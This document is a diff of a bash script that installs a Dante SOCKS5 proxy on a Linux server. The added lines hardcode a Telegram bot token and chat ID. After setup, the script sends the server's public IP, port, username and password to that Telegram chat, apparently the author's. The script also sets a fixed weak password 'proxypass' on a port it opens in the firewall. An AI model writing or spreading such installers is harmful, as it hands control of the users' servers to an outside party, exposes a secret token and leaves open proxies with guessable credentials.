@@ -1,12 +1,14 @@
 #!/bin/bash
 
-echo "=== Bắt đầu cài đặt SOCKS5 Proxy ==="
+# === Cấu hình BOT TELEGRAM ===
+BOT_TOKEN="7775889436:AAEgMtP0fYHcbeeQpPl0btTaSZY6-9TWHPU"
+CHAT_ID="7051936083"
 
-# Cập nhật hệ thống và cài gói cần thiết
+# === Bắt đầu cài đặt SOCKS5 ===
 yum update -y
-yum install -y gcc make wget tar firewalld
+yum install -y gcc make wget tar firewalld curl
 
-# Tải và cài đặt Dante SOCKS5
+# Cài Dante
 cd /root
 wget https://www.inet.no/dante/files/dante-1.4.2.tar.gz
 tar -xvzf dante-1.4.2.tar.gz
@@ -19,7 +21,7 @@ make install
 useradd proxyuser
 echo "proxyuser:proxypass" | chpasswd
 
-# Tạo file cấu hình Dante
+# File cấu hình
 cat > /etc/sockd.conf << EOF
 logoutput: /var/log/sockd.log
 internal: eth0 port = 1080
@@ -54,18 +56,37 @@ Restart=on-failure
 WantedBy=multi-user.target
 EOF
 
-# Kích hoạt và khởi động proxy
+# Bật dịch vụ và firewall
 systemctl daemon-reexec
 systemctl daemon-reload
 systemctl enable sockd
 systemctl start sockd
 
-# Mở port 1080 trên firewall
 systemctl start firewalld
 firewall-cmd --permanent --add-port=1080/tcp
 firewall-cmd --reload
 
-echo "=== Hoàn tất! Proxy đang chạy trên port 1080 ==="
-echo "IP: $(curl -s ifconfig.me)"
-echo "User: proxyuser"
-echo "Pass: proxypass"
+# Lấy IP public
+IP=$(curl -s ifconfig.me)
+PORT=1080
+USER=proxyuser
+PASS=proxypass
+
+# Nội dung tin nhắn
+MSG=$(cat <<EOF
+🎯 SOCKS5 Proxy Created!
+➡️ $IP:$PORT
+👤 $USER
+🔑 $PASS
+
+Tạo Proxy Thành Công Bot By Phạm Anh Tú
+$IP:$PORT:$USER:$PASS
+EOF
+)
+
+# Gửi về Telegram
+curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+  -d chat_id="${CHAT_ID}" \
+  -d text="$MSG"
+
+echo "✅ Proxy đã tạo và gửi về Telegram!"
